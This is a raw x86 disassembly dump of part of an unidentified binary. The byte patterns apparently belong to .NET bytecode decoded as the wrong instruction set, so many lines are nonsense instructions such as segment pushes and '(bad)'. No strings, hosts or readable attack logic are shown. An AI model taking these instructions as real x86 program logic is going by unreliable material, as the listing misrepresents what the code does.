  402b93:	39 00                	cmp    %eax,(%eax)
  402b95:	00 0a                	add    %cl,(%edx)
  402b97:	1a 6a 28             	sbb    0x28(%edx),%ch
  402b9a:	0d 00 00 06 28       	or     $0x28060000,%eax
  402b9f:	0c 00                	or     $0x0,%al
  402ba1:	00 06                	add    %al,(%esi)
  402ba3:	d4 8d                	aam    $0x8d
  402ba5:	44                   	inc    %esp
  402ba6:	00 00                	add    %al,(%eax)
  402ba8:	01 28                	add    %ebp,(%eax)
  402baa:	0b 00                	or     (%eax),%eax
  402bac:	00 06                	add    %al,(%esi)
  402bae:	16                   	push   %ss
  402baf:	6a 28                	push   $0x28
  402bb1:	0f 00 00             	sldt   (%eax)
  402bb4:	06                   	push   %es
  402bb5:	28 2f                	sub    %ch,(%edi)
  402bb7:	00 00                	add    %al,(%eax)
  402bb9:	06                   	push   %es
  402bba:	28 20                	sub    %ah,(%eax)
  402bbc:	00 00                	add    %al,(%eax)
  402bbe:	06                   	push   %es
  402bbf:	16                   	push   %ss
  402bc0:	28 18                	sub    %bl,(%eax)
  402bc2:	00 00                	add    %al,(%eax)
  402bc4:	06                   	push   %es
  402bc5:	16                   	push   %ss
  402bc6:	28 1a                	sub    %bl,(%edx)
  402bc8:	00 00                	add    %al,(%eax)
  402bca:	06                   	push   %es
  402bcb:	14 fe                	adc    $0xfe,%al
  402bcd:	06                   	push   %es
  402bce:	21 00                	and    %eax,(%eax)
  402bd0:	00 06                	add    %al,(%esi)
  402bd2:	73 3a                	jae    0x402c0e
  402bd4:	00 00                	add    %al,(%eax)
  402bd6:	0a 14 73             	or     (%ebx,%esi,2),%dl
  402bd9:	27                   	daa
  402bda:	00 00                	add    %al,(%eax)
  402bdc:	0a 20                	or     (%eax),%ah
  402bde:	10 27                	adc    %ah,(%edi)
  402be0:	00 00                	add    %al,(%eax)
  402be2:	20 98 3a 00 00 6f    	and    %bl,0x6f00003a(%eax)
  402be8:	32 00                	xor    (%eax),%al
  402bea:	00 0a                	add    %cl,(%edx)
  402bec:	73 27                	jae    0x402c15
  402bee:	00 00                	add    %al,(%eax)
  402bf0:	0a 20                	or     (%eax),%ah
  402bf2:	10 27                	adc    %ah,(%edi)
  402bf4:	00 00                	add    %al,(%eax)
  402bf6:	20 98 3a 00 00 6f    	and    %bl,0x6f00003a(%eax)
  402bfc:	32 00                	xor    (%eax),%al
  402bfe:	00 0a                	add    %cl,(%edx)
  402c00:	73 3b                	jae    0x402c3d
  402c02:	00 00                	add    %al,(%eax)
  402c04:	0a 28                	or     (%eax),%ch
  402c06:	11 00                	adc    %eax,(%eax)
  402c08:	00 06                	add    %al,(%esi)
  402c0a:	14 fe                	adc    $0xfe,%al
  402c0c:	06                   	push   %es
  402c0d:	22 00                	and    (%eax),%al
  402c0f:	00 06                	add    %al,(%esi)
  402c11:	73 3a                	jae    0x402c4d
  402c13:	00 00                	add    %al,(%eax)
  402c15:	0a 14 17             	or     (%edi,%edx,1),%dl
  402c18:	17                   	pop    %ss
  402c19:	73 3b                	jae    0x402c56
  402c1b:	00 00                	add    %al,(%eax)
  402c1d:	0a 28                	or     (%eax),%ch
  402c1f:	16                   	push   %ss
  402c20:	00 00                	add    %al,(%eax)
  402c22:	06                   	push   %es
  402c23:	28 08                	sub    %cl,(%eax)
  402c25:	00 00                	add    %al,(%eax)
  402c27:	06                   	push   %es
  402c28:	28 0a                	sub    %cl,(%edx)
  402c2a:	00 00                	add    %al,(%eax)
  402c2c:	06                   	push   %es
  402c2d:	28 0e                	sub    %cl,(%esi)
  402c2f:	00 00                	add    %al,(%eax)
  402c31:	06                   	push   %es
  402c32:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  402c38:	69 14 fe 06 1f 00 00 	imul   $0x1f06,(%esi,%edi,8),%edx
  402c3f:	06                   	push   %es
  402c40:	73 3c                	jae    0x402c7e
  402c42:	00 00                	add    %al,(%eax)
  402c44:	0a 14 6f             	or     (%edi,%ebp,2),%dl
  402c47:	3d 00 00 0a 26       	cmp    $0x260a0000,%eax
  402c4c:	38 06                	cmp    %al,(%esi)
  402c4e:	00 00                	add    %al,(%eax)
  402c50:	00 16                	add    %dl,(%esi)
  402c52:	28 13                	sub    %dl,(%ebx)
  402c54:	00 00                	add    %al,(%eax)
  402c56:	06                   	push   %es
  402c57:	dd 0c 00             	fisttpll (%eax,%eax,1)
  402c5a:	00 00                	add    %al,(%eax)
  402c5c:	26 16                	es push %ss
  402c5e:	28 13                	sub    %dl,(%ebx)
  402c60:	00 00                	add    %al,(%eax)
  402c62:	06                   	push   %es
  402c63:	dd 00                	fldl   (%eax)
  402c65:	00 00                	add    %al,(%eax)
  402c67:	00 2a                	add    %ch,(%edx)
  402c69:	00 00                	add    %al,(%eax)
  402c6b:	00 41 4c             	add    %al,0x4c(%ecx)
  402c6e:	00 00                	add    %al,(%eax)
  402c70:	00 00                	add    %al,(%eax)
  402c72:	00 00                	add    %al,(%eax)
  402c74:	ce                   	into
  402c75:	00 00                	add    %al,(%eax)
  402c77:	00 26                	add    %ah,(%esi)
  402c79:	00 00                	add    %al,(%eax)
  402c7b:	00 f4                	add    %dh,%ah
  402c7d:	00 00                	add    %al,(%eax)
  402c7f:	00 06                	add    %al,(%esi)
  402c81:	00 00                	add    %al,(%eax)
  402c83:	00 01                	add    %al,(%ecx)
  402c85:	00 00                	add    %al,(%eax)
  402c87:	01 02                	add    %eax,(%edx)
  402c89:	00 00                	add    %al,(%eax)
  402c8b:	00 21                	add    %ah,(%ecx)
  402c8d:	01 00                	add    %eax,(%eax)
  402c8f:	00 82 00 00 00 a3    	add    %al,-0x5d000000(%edx)
  402c95:	01 00                	add    %eax,(%eax)
  402c97:	00 0f                	add    %cl,(%edi)
	...
  402ca5:	00 00                	add    %al,(%eax)
  402ca7:	00 e4                	add    %ah,%ah
  402ca9:	02 00                	add    (%eax),%al
  402cab:	00 e4                	add    %ah,%ah
  402cad:	02 00                	add    (%eax),%al
  402caf:	00 0c 00             	add    %cl,(%eax,%eax,1)
  402cb2:	00 00                	add    %al,(%eax)
  402cb4:	01 00                	add    %eax,(%eax)
  402cb6:	00 01                	add    %al,(%ecx)
  402cb8:	1b 30                	sbb    (%eax),%esi
  402cba:	02 00                	add    (%eax),%al
  402cbc:	6a 00                	push   $0x0
  402cbe:	00 00                	add    %al,(%eax)
  402cc0:	00 00                	add    %al,(%eax)
  402cc2:	00 00                	add    %al,(%eax)
  402cc4:	28 08                	sub    %cl,(%eax)
  402cc6:	00 00                	add    %al,(%eax)
  402cc8:	06                   	push   %es
  402cc9:	25 3a 06 00 00       	and    $0x63a,%eax
  402cce:	00 26                	add    %ah,(%esi)
  402cd0:	38 05 00 00 00 28    	cmp    %al,0x28000000
  402cd6:	40                   	inc    %eax
  402cd7:	00 00                	add    %al,(%eax)
  402cd9:	0a 28                	or     (%eax),%ch
  402cdb:	06                   	push   %es
  402cdc:	00 00                	add    %al,(%eax)
  402cde:	06                   	push   %es
  402cdf:	25 3a 06 00 00       	and    $0x63a,%eax
  402ce4:	00 26                	add    %ah,(%esi)
  402ce6:	38 05 00 00 00 28    	cmp    %al,0x28000000
  402cec:	41                   	inc    %ecx
  402ced:	00 00                	add    %al,(%eax)
  402cef:	0a 28                	or     (%eax),%ch
  402cf1:	15 00 00 06 25       	adc    $0x25060000,%eax
  402cf6:	3a 06                	cmp    (%esi),%al
  402cf8:	00 00                	add    %al,(%eax)
  402cfa:	00 26                	add    %ah,(%esi)
  402cfc:	38 05 00 00 00 28    	cmp    %al,0x28000000
  402d02:	42                   	inc    %edx
  402d03:	00 00                	add    %al,(%eax)
  402d05:	0a 28                	or     (%eax),%ch
  402d07:	10 00                	adc    %al,(%eax)
  402d09:	00 06                	add    %al,(%esi)
  402d0b:	25 3a 06 00 00       	and    $0x63a,%eax
  402d10:	00 26                	add    %ah,(%esi)
  402d12:	38 05 00 00 00 28    	cmp    %al,0x28000000
  402d18:	42                   	inc    %edx
  402d19:	00 00                	add    %al,(%eax)
  402d1b:	0a dd                	or     %ch,%bl
  402d1d:	06                   	push   %es
  402d1e:	00 00                	add    %al,(%eax)
  402d20:	00 26                	add    %ah,(%esi)
  402d22:	dd 00                	fldl   (%eax)
  402d24:	00 00                	add    %al,(%eax)
  402d26:	00 16                	add    %dl,(%esi)
  402d28:	28 13                	sub    %dl,(%ebx)
  402d2a:	00 00                	add    %al,(%eax)
  402d2c:	06                   	push   %es
  402d2d:	2a 00                	sub    (%eax),%al
  402d2f:	00 01                	add    %al,(%ecx)
  402d31:	10 00                	adc    %al,(%eax)
  402d33:	00 00                	add    %al,(%eax)
  402d35:	00 00                	add    %al,(%eax)
  402d37:	00 5d 5d             	add    %bl,0x5d(%ebp)
  402d3a:	00 06                	add    %al,(%esi)
  402d3c:	01 00                	add    %eax,(%eax)
  402d3e:	00 01                	add    %al,(%ecx)
  402d40:	1b 30                	sbb    (%eax),%esi
  402d42:	06                   	push   %es
  402d43:	00 ba 01 00 00 04    	add    %bh,0x4000001(%edx)
  402d49:	00 00                	add    %al,(%eax)
  402d4b:	11 28                	adc    %ebp,(%eax)
  402d4d:	06                   	push   %es
  402d4e:	00 00                	add    %al,(%eax)
  402d50:	06                   	push   %es
  402d51:	6f                   	outsl  %ds:(%esi),(%dx)
  402d52:	2b 00                	sub    (%eax),%eax
  402d54:	00 0a                	add    %cl,(%edx)
  402d56:	39 0a                	cmp    %ecx,(%edx)
  402d58:	00 00                	add    %al,(%eax)
  402d5a:	00 28                	add    %ch,(%eax)
  402d5c:	12 00                	adc    (%eax),%al
  402d5e:	00 06                	add    %al,(%esi)
  402d60:	3a 0b                	cmp    (%ebx),%cl
  402d62:	00 00                	add    %al,(%eax)
  402d64:	00 16                	add    %dl,(%esi)
  402d66:	28 13                	sub    %dl,(%ebx)
  402d68:	00 00                	add    %al,(%eax)
  402d6a:	06                   	push   %es
  402d6b:	dd 95 01 00 00 28    	fstl   0x28000001(%ebp)
  402d71:	08 00                	or     %al,(%eax)
  402d73:	00 06                	add    %al,(%esi)
  402d75:	02 6f 43             	add    0x43(%edi),%ch
  402d78:	00 00                	add    %al,(%eax)
  402d7a:	0a 0a                	or     (%edx),%cl
  402d7c:	06                   	push   %es
  402d7d:	16                   	push   %ss
  402d7e:	3e 6b 01 00          	imul   $0x0,%ds:(%ecx),%eax
  402d82:	00 28                	add    %ch,(%eax)
  402d84:	0e                   	push   %cs
  402d85:	00 00                	add    %al,(%eax)
  402d87:	06                   	push   %es
  402d88:	06                   	push   %es
  402d89:	6a 58                	push   $0x58
  402d8b:	28 0f                	sub    %cl,(%edi)
  402d8d:	00 00                	add    %al,(%eax)
  402d8f:	06                   	push   %es
  402d90:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402d93:	00 06                	add    %al,(%esi)
  402d95:	06                   	push   %es
  402d96:	6a 59                	push   $0x59
  402d98:	28 0d 00 00 06 28    	sub    %cl,0x28060000
  402d9e:	0c 00                	or     $0x0,%al
  402da0:	00 06                	add    %al,(%esi)
  402da2:	3a 02                	cmp    (%edx),%al
  402da4:	01 00                	add    %eax,(%eax)
  402da6:	00 28                	add    %ch,(%eax)
  402da8:	0a 00                	or     (%eax),%al
  402daa:	00 06                	add    %al,(%esi)
  402dac:	16                   	push   %ss
  402dad:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  402db1:	0a 6a 28             	or     0x28(%edx),%ch
  402db4:	0d 00 00 06 28       	or     $0x28060000,%eax
  402db9:	0c 00                	or     $0x0,%al
  402dbb:	00 06                	add    %al,(%esi)
  402dbd:	16                   	push   %ss
  402dbe:	6a 3e                	push   $0x3e
  402dc0:	c2 00 00             	ret    $0x0
  402dc3:	00 16                	add    %dl,(%esi)
  402dc5:	6a 28                	push   $0x28
  402dc7:	0f 00 00             	sldt   (%eax)
  402dca:	06                   	push   %es
  402dcb:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402dce:	00 06                	add    %al,(%esi)
  402dd0:	d4 8d                	aam    $0x8d
  402dd2:	44                   	inc    %esp
  402dd3:	00 00                	add    %al,(%eax)
  402dd5:	01 28                	add    %ebp,(%eax)
  402dd7:	0b 00                	or     (%eax),%eax
  402dd9:	00 06                	add    %al,(%esi)
  402ddb:	38 5f 00             	cmp    %bl,0x0(%edi)
  402dde:	00 00                	add    %al,(%eax)
  402de0:	28 08                	sub    %cl,(%eax)
  402de2:	00 00                	add    %al,(%eax)
  402de4:	06                   	push   %es
  402de5:	28 0a                	sub    %cl,(%edx)
  402de7:	00 00                	add    %al,(%eax)
  402de9:	06                   	push   %es
  402dea:	28 0e                	sub    %cl,(%esi)
  402dec:	00 00                	add    %al,(%eax)
  402dee:	06                   	push   %es
  402def:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  402df5:	69 6f 45 00 00 0a 0b 	imul   $0xb0a0000,0x45(%edi),%ebp
  402dfc:	07                   	pop    %es
  402dfd:	16                   	push   %ss
  402dfe:	3d 0b 00 00 00       	cmp    $0xb,%eax
  402e03:	16                   	push   %ss
  402e04:	28 13                	sub    %dl,(%ebx)
  402e06:	00 00                	add    %al,(%eax)
  402e08:	06                   	push   %es
  402e09:	dd f7                	(bad)
  402e0b:	00 00                	add    %al,(%eax)
  402e0d:	00 28                	add    %ch,(%eax)
  402e0f:	0e                   	push   %cs
  402e10:	00 00                	add    %al,(%eax)
  402e12:	06                   	push   %es
  402e13:	07                   	pop    %es
  402e14:	6a 58                	push   $0x58
  402e16:	28 0f                	sub    %cl,(%edi)
  402e18:	00 00                	add    %al,(%eax)
  402e1a:	06                   	push   %es
  402e1b:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402e1e:	00 06                	add    %al,(%esi)
  402e20:	07                   	pop    %es
  402e21:	6a 59                	push   $0x59
  402e23:	28 0d 00 00 06 28    	sub    %cl,0x28060000
  402e29:	0c 00                	or     $0x0,%al
  402e2b:	00 06                	add    %al,(%esi)
  402e2d:	16                   	push   %ss
  402e2e:	6a 3c                	push   $0x3c
  402e30:	0b 00                	or     (%eax),%eax
  402e32:	00 00                	add    %al,(%eax)
  402e34:	16                   	push   %ss
  402e35:	28 13                	sub    %dl,(%ebx)
  402e37:	00 00                	add    %al,(%eax)
  402e39:	06                   	push   %es
  402e3a:	dd c6                	ffree  %st(6)
  402e3c:	00 00                	add    %al,(%eax)
  402e3e:	00 28                	add    %ch,(%eax)
  402e40:	0c 00                	or     $0x0,%al
  402e42:	00 06                	add    %al,(%esi)
  402e44:	16                   	push   %ss
  402e45:	6a 30                	push   $0x30
  402e47:	98                   	cwtl
  402e48:	14 fe                	adc    $0xfe,%al
  402e4a:	06                   	push   %es
  402e4b:	46                   	inc    %esi
  402e4c:	00 00                	add    %al,(%eax)
  402e4e:	06                   	push   %es
  402e4f:	73 46                	jae    0x402e97
  402e51:	00 00                	add    %al,(%eax)
  402e53:	0a 73 47             	or     0x47(%ebx),%dh
  402e56:	00 00                	add    %al,(%eax)
  402e58:	0a 28                	or     (%eax),%ch
  402e5a:	0a 00                	or     (%eax),%al
  402e5c:	00 06                	add    %al,(%esi)
  402e5e:	6f                   	outsl  %ds:(%esi),(%dx)
  402e5f:	48                   	dec    %eax
  402e60:	00 00                	add    %al,(%eax)
  402e62:	0a 16                	or     (%esi),%dl
  402e64:	6a 28                	push   $0x28
  402e66:	0f 00 00             	sldt   (%eax)
  402e69:	06                   	push   %es
  402e6a:	1a 6a 28             	sbb    0x28(%edx),%ch
  402e6d:	0d 00 00 06 28       	or     $0x28060000,%eax
  402e72:	0c 00                	or     $0x0,%al
  402e74:	00 06                	add    %al,(%esi)
  402e76:	d4 8d                	aam    $0x8d
  402e78:	44                   	inc    %esp
  402e79:	00 00                	add    %al,(%eax)
  402e7b:	01 28                	add    %ebp,(%eax)
  402e7d:	0b 00                	or     (%eax),%eax
  402e7f:	00 06                	add    %al,(%esi)
  402e81:	38 3a                	cmp    %bh,(%edx)
  402e83:	00 00                	add    %al,(%eax)
  402e85:	00 1a                	add    %bl,(%edx)
  402e87:	6a 28                	push   $0x28
  402e89:	0d 00 00 06 28       	or     $0x28060000,%eax
  402e8e:	0c 00                	or     $0x0,%al
  402e90:	00 06                	add    %al,(%esi)
  402e92:	d4 8d                	aam    $0x8d
  402e94:	44                   	inc    %esp
  402e95:	00 00                	add    %al,(%eax)
  402e97:	01 28                	add    %ebp,(%eax)
  402e99:	0b 00                	or     (%eax),%eax
  402e9b:	00 06                	add    %al,(%esi)
  402e9d:	16                   	push   %ss
  402e9e:	6a 28                	push   $0x28
  402ea0:	0f 00 00             	sldt   (%eax)
  402ea3:	06                   	push   %es
  402ea4:	38 17                	cmp    %dl,(%edi)
  402ea6:	00 00                	add    %al,(%eax)
  402ea8:	00 28                	add    %ch,(%eax)
  402eaa:	0c 00                	or     $0x0,%al
  402eac:	00 06                	add    %al,(%esi)
  402eae:	16                   	push   %ss
  402eaf:	6a 3c                	push   $0x3c
  402eb1:	0b 00                	or     (%eax),%eax
  402eb3:	00 00                	add    %al,(%eax)
  402eb5:	16                   	push   %ss
  402eb6:	28 13                	sub    %dl,(%ebx)
  402eb8:	00 00                	add    %al,(%eax)
  402eba:	06                   	push   %es
  402ebb:	dd 45 00             	fldl   0x0(%ebp)
  402ebe:	00 00                	add    %al,(%eax)
  402ec0:	28 08                	sub    %cl,(%eax)
  402ec2:	00 00                	add    %al,(%eax)
  402ec4:	06                   	push   %es
  402ec5:	28 0a                	sub    %cl,(%edx)
  402ec7:	00 00                	add    %al,(%eax)
  402ec9:	06                   	push   %es
  402eca:	28 0e                	sub    %cl,(%esi)
  402ecc:	00 00                	add    %al,(%eax)
  402ece:	06                   	push   %es
  402ecf:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  402ed5:	69 14 fe 06 1f 00 00 	imul   $0x1f06,(%esi,%edi,8),%edx
  402edc:	06                   	push   %es
  402edd:	73 3c                	jae    0x402f1b
  402edf:	00 00                	add    %al,(%eax)
  402ee1:	0a 14 6f             	or     (%edi,%ebp,2),%dl
  402ee4:	3d 00 00 0a 26       	cmp    $0x260a0000,%eax
  402ee9:	38 06                	cmp    %al,(%esi)
  402eeb:	00 00                	add    %al,(%eax)
  402eed:	00 16                	add    %dl,(%esi)
  402eef:	28 13                	sub    %dl,(%ebx)
  402ef1:	00 00                	add    %al,(%eax)
  402ef3:	06                   	push   %es
  402ef4:	dd 0c 00             	fisttpll (%eax,%eax,1)
  402ef7:	00 00                	add    %al,(%eax)
  402ef9:	26 16                	es push %ss
  402efb:	28 13                	sub    %dl,(%ebx)
  402efd:	00 00                	add    %al,(%eax)
  402eff:	06                   	push   %es
  402f00:	dd 00                	fldl   (%eax)
  402f02:	00 00                	add    %al,(%eax)
  402f04:	00 2a                	add    %ch,(%edx)
  402f06:	00 00                	add    %al,(%eax)
  402f08:	41                   	inc    %ecx
  402f09:	1c 00                	sbb    $0x0,%al
	...
  402f13:	00 ad 01 00 00 ad    	add    %ch,-0x52ffffff(%ebp)
  402f19:	01 00                	add    %eax,(%eax)
  402f1b:	00 0c 00             	add    %cl,(%eax,%eax,1)
  402f1e:	00 00                	add    %al,(%eax)
  402f20:	01 00                	add    %eax,(%eax)
  402f22:	00 01                	add    %al,(%ecx)
  402f24:	1b 30                	sbb    (%eax),%esi
  402f26:	04 00                	add    $0x0,%al
  402f28:	04 01                	add    $0x1,%al
  402f2a:	00 00                	add    %al,(%eax)
  402f2c:	05 00 00 11 28       	add    $0x28110000,%eax
  402f31:	14 00                	adc    $0x0,%al
  402f33:	00 06                	add    %al,(%esi)
  402f35:	0a 16                	or     (%esi),%dl
  402f37:	0b 06                	or     (%esi),%eax
  402f39:	12 01                	adc    (%ecx),%al
  402f3b:	28 49 00             	sub    %cl,0x0(%ecx)
  402f3e:	00 0a                	add    %cl,(%edx)
  402f40:	28 12                	sub    %dl,(%edx)
  402f42:	00 00                	add    %al,(%eax)
  402f44:	06                   	push   %es
  402f45:	3a 05 00 00 00 dd    	cmp    0xdd000000,%al
  402f4b:	e4 00                	in     $0x0,%al
  402f4d:	00 00                	add    %al,(%eax)
  402f4f:	02 8e 69 28 4a 00    	add    0x4a2869(%esi),%cl
  402f55:	00 0a                	add    %cl,(%edx)
  402f57:	0c 28                	or     $0x28,%al
  402f59:	06                   	push   %es
  402f5a:	00 00                	add    %al,(%eax)
  402f5c:	06                   	push   %es
  402f5d:	15 17 6f 4b 00       	adc    $0x4b6f17,%eax
  402f62:	00 0a                	add    %cl,(%edx)
  402f64:	26 28 08             	sub    %cl,%es:(%eax)
  402f67:	00 00                	add    %al,(%eax)
  402f69:	06                   	push   %es
  402f6a:	08 16                	or     %dl,(%esi)
  402f6c:	08 8e 69 6f 4c 00    	or     %cl,0x4c6f69(%esi)
  402f72:	00 0a                	add    %cl,(%edx)
  402f74:	02 8e 69 20 40 42    	add    0x42402069(%esi),%cl
  402f7a:	0f 00                	(bad)
  402f7c:	3e 6e                	outsb  %ds:(%esi),(%dx)
  402f7e:	00 00                	add    %al,(%eax)
  402f80:	00 02                	add    %al,(%edx)
  402f82:	73 4d                	jae    0x402fd1
  402f84:	00 00                	add    %al,(%eax)
  402f86:	0a 0d 16 13 04 09    	or     0x9041316,%cl
  402f8c:	16                   	push   %ss
  402f8d:	6a 6f                	push   $0x6f
  402f8f:	4e                   	dec    %esi
  402f90:	00 00                	add    %al,(%eax)
  402f92:	0a 20                	or     (%eax),%ah
  402f94:	50                   	push   %eax
  402f95:	c3                   	ret
  402f96:	00 00                	add    %al,(%eax)
  402f98:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  402f9c:	01 13                	add    %edx,(%ebx)
  402f9e:	05 38 26 00 00       	add    $0x2638,%eax
  402fa3:	00 28                	add    %ch,(%eax)
  402fa5:	06                   	push   %es
  402fa6:	00 00                	add    %al,(%eax)
  402fa8:	06                   	push   %es
  402fa9:	15 17 6f 4b 00       	adc    $0x4b6f17,%eax
  402fae:	00 0a                	add    %cl,(%edx)
  402fb0:	26 28 08             	sub    %cl,%es:(%eax)
  402fb3:	00 00                	add    %al,(%eax)
  402fb5:	06                   	push   %es
  402fb6:	11 05 16 11 04 6f    	adc    %eax,0x6f041116
  402fbc:	4c                   	dec    %esp
  402fbd:	00 00                	add    %al,(%eax)
  402fbf:	0a 28                	or     (%eax),%ch
  402fc1:	08 00                	or     %al,(%eax)
  402fc3:	00 06                	add    %al,(%esi)
  402fc5:	6f                   	outsl  %ds:(%esi),(%dx)
  402fc6:	4f                   	dec    %edi
  402fc7:	00 00                	add    %al,(%eax)
  402fc9:	0a 09                	or     (%ecx),%cl
  402fcb:	11 05 16 11 05 8e    	adc    %eax,0x8e051116
  402fd1:	69 6f 45 00 00 0a 25 	imul   $0x250a0000,0x45(%edi),%ebp
  402fd8:	13 04 16             	adc    (%esi,%edx,1),%eax
  402fdb:	30 c7                	xor    %al,%bh
  402fdd:	dd 33                	fnsave (%ebx)
  402fdf:	00 00                	add    %al,(%eax)
  402fe1:	00 09                	add    %cl,(%ecx)
  402fe3:	39 06                	cmp    %eax,(%esi)
  402fe5:	00 00                	add    %al,(%eax)
  402fe7:	00 09                	add    %cl,(%ecx)
  402fe9:	6f                   	outsl  %ds:(%esi),(%dx)
  402fea:	33 00                	xor    (%eax),%eax
  402fec:	00 0a                	add    %cl,(%edx)
  402fee:	dc 28                	fsubrl (%eax)
  402ff0:	06                   	push   %es
  402ff1:	00 00                	add    %al,(%eax)
  402ff3:	06                   	push   %es
  402ff4:	15 17 6f 4b 00       	adc    $0x4b6f17,%eax
  402ff9:	00 0a                	add    %cl,(%edx)
  402ffb:	26 28 08             	sub    %cl,%es:(%eax)
  402ffe:	00 00                	add    %al,(%eax)
  403000:	06                   	push   %es
  403001:	02 16                	add    (%esi),%dl
  403003:	02 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%cl
  403009:	00 0a                	add    %cl,(%edx)
  40300b:	28 08                	sub    %cl,(%eax)
  40300d:	00 00                	add    %al,(%eax)
  40300f:	06                   	push   %es
  403010:	6f                   	outsl  %ds:(%esi),(%dx)
  403011:	4f                   	dec    %edi
  403012:	00 00                	add    %al,(%eax)
  403014:	0a dd                	or     %ch,%bl
  403016:	19 00                	sbb    %eax,(%eax)
  403018:	00 00                	add    %al,(%eax)
  40301a:	26 16                	es push %ss
  40301c:	28 13                	sub    %dl,(%ebx)
  40301e:	00 00                	add    %al,(%eax)
  403020:	06                   	push   %es
  403021:	dd 0d 00 00 00 07    	fisttpll 0x7000000
  403027:	39 06                	cmp    %eax,(%esi)
  403029:	00 00                	add    %al,(%eax)
  40302b:	00 06                	add    %al,(%esi)
  40302d:	28 50 00             	sub    %dl,0x0(%eax)
  403030:	00 0a                	add    %cl,(%edx)
  403032:	dc 2a                	fsubrl (%edx)
  403034:	01 28                	add    %ebp,(%eax)
  403036:	00 00                	add    %al,(%eax)
  403038:	02 00                	add    (%eax),%al
  40303a:	58                   	pop    %eax
  40303b:	00 5a b2             	add    %bl,-0x4e(%edx)
  40303e:	00 0d 00 00 00 00    	add    %cl,0x0
  403044:	00 00                	add    %al,(%eax)
  403046:	10 00                	adc    %al,(%eax)
  403048:	da ea                	(bad)
  40304a:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  40304d:	00 00                	add    %al,(%eax)
  40304f:	01 02                	add    %eax,(%edx)
  403051:	00 08                	add    %cl,(%eax)
  403053:	00 ee                	add    %ch,%dh
  403055:	f6 00 0d             	testb  $0xd,(%eax)
  403058:	00 00                	add    %al,(%eax)
  40305a:	00 00                	add    %al,(%eax)
  40305c:	1b 30                	sbb    (%eax),%esi
  40305e:	03 00                	add    (%eax),%eax
  403060:	50                   	push   %eax
  403061:	00 00                	add    %al,(%eax)
  403063:	00 00                	add    %al,(%eax)
  403065:	00 00                	add    %al,(%eax)
  403067:	00 73 94             	add    %dh,-0x6c(%ebx)
  40306a:	00 00                	add    %al,(%eax)
  40306c:	06                   	push   %es
  40306d:	25 72 b4 22 00       	and    $0x22b472,%eax
  403072:	70 6f                	jo     0x4030e3
  403074:	7f 00                	jg     0x403076
  403076:	00 06                	add    %al,(%esi)
  403078:	72 c2                	jb     0x40303c
  40307a:	22 00                	and    (%eax),%al
  40307c:	70 6f                	jo     0x4030ed
  40307e:	8c 00                	mov    %es,(%eax)
  403080:	00 06                	add    %al,(%esi)
  403082:	25 72 cc 22 00       	and    $0x22cc72,%eax
  403087:	70 6f                	jo     0x4030f8
  403089:	7f 00                	jg     0x40308b
  40308b:	00 06                	add    %al,(%esi)
  40308d:	28 35 00 00 06 6f    	sub    %dh,0x6f060000
  403093:	8c 00                	mov    %es,(%eax)
  403095:	00 06                	add    %al,(%esi)
  403097:	6f                   	outsl  %ds:(%esi),(%dx)
  403098:	89 00                	mov    %eax,(%eax)
  40309a:	00 06                	add    %al,(%esi)
  40309c:	28 20                	sub    %ah,(%eax)
  40309e:	00 00                	add    %al,(%eax)
  4030a0:	06                   	push   %es
  4030a1:	28 51 00             	sub    %dl,0x0(%ecx)
  4030a4:	00 0a                	add    %cl,(%edx)
  4030a6:	17                   	pop    %ss
  4030a7:	28 1a                	sub    %bl,(%edx)
  4030a9:	00 00                	add    %al,(%eax)
  4030ab:	06                   	push   %es
  4030ac:	dd 06                	fldl   (%esi)
  4030ae:	00 00                	add    %al,(%eax)
  4030b0:	00 26                	add    %ah,(%esi)
  4030b2:	dd 00                	fldl   (%eax)
  4030b4:	00 00                	add    %al,(%eax)
  4030b6:	00 2a                	add    %ch,(%edx)
  4030b8:	01 10                	add    %edx,(%eax)
  4030ba:	00 00                	add    %al,(%eax)
  4030bc:	00 00                	add    %al,(%eax)
  4030be:	00 00                	add    %al,(%eax)
  4030c0:	49                   	dec    %ecx
  4030c1:	49                   	dec    %ecx
  4030c2:	00 06                	add    %al,(%esi)
  4030c4:	01 00                	add    %eax,(%eax)
  4030c6:	00 01                	add    %al,(%ecx)
  4030c8:	1b 30                	sbb    (%eax),%esi
  4030ca:	02 00                	add    (%eax),%al
  4030cc:	2c 00                	sub    $0x0,%al
  4030ce:	00 00                	add    %al,(%eax)
  4030d0:	00 00                	add    %al,(%eax)
  4030d2:	00 00                	add    %al,(%eax)
  4030d4:	28 19                	sub    %bl,(%ecx)
  4030d6:	00 00                	add    %al,(%eax)
  4030d8:	06                   	push   %es
  4030d9:	39 16                	cmp    %edx,(%esi)
  4030db:	00 00                	add    %al,(%eax)
  4030dd:	00 28                	add    %ch,(%eax)
  4030df:	12 00                	adc    (%eax),%al
  4030e1:	00 06                	add    %al,(%esi)
  4030e3:	39 0c 00             	cmp    %ecx,(%eax,%eax,1)
  4030e6:	00 00                	add    %al,(%eax)
  4030e8:	28 17                	sub    %dl,(%edi)
  4030ea:	00 00                	add    %al,(%eax)
  4030ec:	06                   	push   %es
  4030ed:	17                   	pop    %ss
  4030ee:	58                   	pop    %eax
  4030ef:	28 18                	sub    %bl,(%eax)
  4030f1:	00 00                	add    %al,(%eax)
  4030f3:	06                   	push   %es
  4030f4:	dd 06                	fldl   (%esi)
  4030f6:	00 00                	add    %al,(%eax)
  4030f8:	00 26                	add    %ah,(%esi)
  4030fa:	dd 00                	fldl   (%eax)
  4030fc:	00 00                	add    %al,(%eax)
  4030fe:	00 2a                	add    %ch,(%edx)
  403100:	01 10                	add    %edx,(%eax)
  403102:	00 00                	add    %al,(%eax)
  403104:	00 00                	add    %al,(%eax)
  403106:	00 00                	add    %al,(%eax)
  403108:	25 25 00 06 01       	and    $0x1060025,%eax
  40310d:	00 00                	add    %al,(%eax)
  40310f:	01 1b                	add    %ebx,(%ebx)
  403111:	30 05 00 76 02 00    	xor    %al,0x27600
  403117:	00 06                	add    %al,(%esi)
  403119:	00 00                	add    %al,(%eax)
